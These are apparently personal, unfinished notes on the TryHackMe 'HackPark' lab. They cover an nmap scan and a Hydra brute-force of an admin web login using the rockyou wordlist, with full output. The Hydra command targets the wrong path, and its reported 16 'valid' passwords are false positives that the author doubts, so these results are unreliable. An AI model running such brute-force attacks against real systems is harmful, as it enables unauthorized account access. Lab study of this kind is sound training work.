[TryHackMe \| HackPark](https://tryhackme.com/room/hackpark)

---
# Enumeration
## Nmap
```
nmap -p- 10.10.158.222
```

## Port 80 - Webserver
![[Pasted image 20251018151941.png]]

# Whats the name of the clown displayed on the homepage?
The hint indicates that we have to conduct a reverse image search of the image, a quick google search will provide sites like: tinyeye, etc. Paste the image and sources of other matches will be there
![[Pasted image 20251018152626.png]]
The Clown itself is from the movie IT, with the name: Pennywise

# Using Hydra to brute-force a login
![[Pasted image 20251018152750.png]]
The login page can be found at the URL: [Title Unavailable \| Site Unreachable](http://10.10.205.233/Account/login.aspx?ReturnURL=/admin/)

We have seen that the user "Administrator" created the clown post, so we can assume that that is a user which we can use to log into the website
Lets give it a try with Hydra
## What request type is the Windows website login form using?
1. We can inspect the login page using the firefox inspect feature of if we used burpsuite to capture the packet
![[Pasted image 20251018153257.png]]

## Cracking POST Request Login Page with Hydra (http-post-form)
```
hydra -l <user> -P <password.txt> <ip-target> http-post-form "header_file_name:request:error_notif"

# Command

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

```
### Hydra HTTP Crack Output
```bash
                                                                                                           
┌──(root㉿kali)-[/home/z3tssu]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form http://10.10.205.233/Account/login.aspx?ReturnURL=/admin/ 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-18 15:38:48
[ERROR] optional parameter must start with a '/' slash!

                                                                                                                  
┌──(root㉿kali)-[/home/z3tssu]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-18 15:39:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.205.233:80/:username=^USER^&password=^PASS^:F=incorrect
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.205.233 - login "admin" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[80][http-post-form] host: 10.10.205.233   login: admin   password: babygirl
[80][http-post-form] host: 10.10.205.233   login: admin   password: jessica
[80][http-post-form] host: 10.10.205.233   login: admin   password: 123456
[80][http-post-form] host: 10.10.205.233   login: admin   password: 12345
[80][http-post-form] host: 10.10.205.233   login: admin   password: 12345678
[80][http-post-form] host: 10.10.205.233   login: admin   password: abc123
[80][http-post-form] host: 10.10.205.233   login: admin   password: monkey
[80][http-post-form] host: 10.10.205.233   login: admin   password: 123456789
[80][http-post-form] host: 10.10.205.233   login: admin   password: iloveyou
[80][http-post-form] host: 10.10.205.233   login: admin   password: princess
[80][http-post-form] host: 10.10.205.233   login: admin   password: daniel
[80][http-post-form] host: 10.10.205.233   login: admin   password: rockyou
[80][http-post-form] host: 10.10.205.233   login: admin   password: nicole
[80][http-post-form] host: 10.10.205.233   login: admin   password: password
[80][http-post-form] host: 10.10.205.233   login: admin   password: 1234567
[80][http-post-form] host: 10.10.205.233   login: admin   password: lovely
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-18 15:40:00
```
based on the above we have found 16 valid password? I'm not sure if that is correct lol
lets test it out

Maybe we have to now create a password list from the above to test it out?


